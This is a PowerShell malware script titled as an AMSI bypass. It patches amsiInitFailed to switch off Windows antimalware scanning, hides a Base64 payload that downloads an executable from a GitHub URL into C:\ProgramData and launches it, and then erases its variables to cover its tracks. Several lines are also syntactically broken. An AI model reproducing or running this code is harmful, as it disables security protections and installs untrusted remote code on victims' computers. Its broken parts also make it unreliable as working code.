# AMSI Bypass v3.1 - Fixed Parser Errors
${++}=Get-Random;$___=Get-Date;$--=[char[]]('a','m','s','i');$_-=0..3|%{[char]($_[$_])};$__='.'+'d'+'l'+'l'

# Stage 2: Linguistic bypass
$strings=@('A','m','s','i','S','c','a','n','B','u','f','f','e','r');foreach($s in $strings){if([AppDomain]::CurrentDomain.GetAssemblies()|? Location -like "*$s*"){$s='';break}}

# Stage 3: Env seed
$envVars='UserProfile','ComputerName','PSVersionTable';$seed=$envVars|%{Get-Item $_}|% Value|%{[int]($_[0])}
$encPayload=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((gp env:USERNAME).Value+(gp env:COMPUTERNAME).Value))

# Stage 4: FIXED - Proper XOR + AmsiInitFailed patch
function g{$b=[byte[]]$args[0].Split(' ')|%{[Convert]::ToByte($_,10)}; $out=''; $b|%{$out+=[char]($_-bxor($seed%256))};$out}
$dec=g '77 97 110 97 103 101 109 101 110 116 65 117 116 111 109 97 116 105 111 110 46 65 109 115 105 85 116 105 108 115'
if($t=[type]$dec -and $t::'am'#+'siInitFailed'){$t::'am'#+'siInitFailed'.SetValue($null,$true)}

# Stage 5-6: Payload + FIXED decoding
$f1='JA';$f2='BmAHIAYQBnADMA';$f3='PQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsA';$f4='UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='
$fullPayload=$f1+$f2+$f3+$f4;$bytes=[Convert]::FromBase64String($fullPayload);$final='';$r=Get-Random
for($i=0;$i-lt$bytes.Length;$i+=2){$final+=[char][BitConverter]::ToInt16($bytes[$i..($i+1)],0);Start-Sleep -m($r%3)}

# Stage 7: FIXED invocation
&([ScriptBlock]::Create($final))

# Stage 8: Cleanup
0..9|%{rv(gv('_'+'_'*(Get-Random%3))-ErrorAction SilentlyContinue)};rm alias:function:* -ErrorAction SilentlyContinue
